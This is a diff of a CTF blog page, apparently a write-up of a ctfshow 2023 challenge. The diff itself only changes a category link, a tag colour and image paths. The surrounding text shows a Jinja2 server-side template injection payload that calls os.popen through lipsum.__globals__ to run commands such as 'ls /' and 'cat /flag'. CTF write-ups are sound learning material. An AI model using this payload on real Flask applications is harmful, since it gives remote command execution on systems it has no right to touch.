@@ -196,11 +196,11 @@
         </span>
         
         <span class="category">
-            <a href="/blog/categories/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">
+            <a href="/blog/categories/ctfshow/">
                 <span class="icon">
                     <i class="fa-solid fa-bookmark fa-fw"></i>
                 </span>
-                赛后复现
+                ctfshow
             </a>
         </span>
         
@@ -212,7 +212,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #00bcd4">CTF线上赛</a>
+                <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #ffa2c4">CTF线上赛</a>
             </span>
             
         </span>
@@ -383,7 +383,7 @@
 <p>SSTI</p>
 </blockquote>
 <p>打开题目，f12发现提示</p>
-<p><img src="/blog/ctfshow2023%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230430194550659.png" alt="image-20230430194550659"></p>
+<p><img src="/blog/2023/04/30/ctfshow2023%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230430194550659.png" alt="image-20230430194550659"></p>
 <p>访问下载app.zip并解压得到源码</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
 <span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template_string<span class="token punctuation">,</span>render_template
@@ -408,7 +408,7 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
 <p>发现不行，于是尝试以传参方法执行命令</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>?a<span class="token operator">=</span>ls <span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/blog/ctfshow2023%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230430200350864.png" alt="image-20230430200350864"></p>
+<p><img src="/blog/2023/04/30/ctfshow2023%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230430200350864.png" alt="image-20230430200350864"></p>
 <p>成功，直接<code>cat /flag</code>获取flag</p>
 
     </div>
